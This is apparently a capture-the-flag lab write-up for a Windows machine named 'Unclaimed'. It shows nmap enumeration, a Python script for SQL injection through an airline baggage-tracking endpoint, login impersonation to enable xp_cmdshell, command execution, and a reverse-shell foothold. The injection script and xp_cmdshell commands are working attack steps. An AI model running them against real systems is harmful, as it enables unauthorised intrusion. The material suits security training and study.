### Initial Enumeration
```bash:command
$ nmap -sCV 10.129.206.189 -oA nmap/Unclaimed
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```
The target is a Windows host with SMB and WinRM enabled. SMB signing is enforced, and the host identifies as `UNCLAIMED` in the `unclaimed` domain.

### Web Application Analysis
![HTB Airlines Interface](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ab8e823-0bc9-81c8-9d0d-000312de7942/c08d7c03-093b-44a3-8046-7b86cb36f1b8/image.png)
The site provides a baggage tracking interface. Inputting data triggers a backend SQL query, which is processed via a `/ask` endpoint.

### SQL Injection Exploitation
The application requires a specific bypass code, `HTB-OPS-4471`, to process SQL queries. I developed a Python script to automate the injection process and extract database metadata.

*   **Payload Structure**: Injects `UNION SELECT` statements into the `msg` JSON parameter.
*   **Automation**: Handles the `CAST` requirements to prevent type-mismatch errors.
*   **Execution**: Allows interactive raw SQL command execution.

```python:sql.py
import requests, json
URL = "http://unclaimed.htb/ask"
HEADERS = {"Content-Type": "application/json", "Origin": "http://unclaimed.htb"}

def run_raw(sql):
    data = {"msg": f"HTB-OPS-4471 ' {sql} -- -"}
    try:
        r = requests.post(URL, headers=HEADERS, json=data, timeout=10)
        print(json.dumps(r.json(), indent=2))
    except Exception as e:
        print(f"Error: {e}")

while True:
    cmd = input("RAW SQL> ")
    if cmd.lower() == 'exit': break
    run_raw(cmd)
```

```bash:command
RAW SQL> EXECUTE AS LOGIN = 'svc_reports'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
RAW SQL> EXECUTE AS LOGIN = 'svc_reports'; EXEC xp_cmdshell 'whoami'
{
  "reply": "The query executed successfully, and the output is \"unclaimed\\svc_sql\".",
  "result": {"rows": [["unclaimed\\svc_sql"]]}
}
```
I identified that `svc_tracer_ro` can impersonate `svc_reports`, which possesses `sysadmin` privileges. Using `xp_cmdshell`, I achieved remote code execution as `unclaimed\svc_sql`.

### Foothold
```bash:command
$ penelope -M
(Penelope)> listeners add -i tun0 -p 9001
(Penelope)─(Session [1])> interact
PS C:\users\svc_sql\Desktop> type user.txt
[REDACTED_FLAG]
```
A reverse shell was established via `xp_cmdshell`, granting access to the user flag.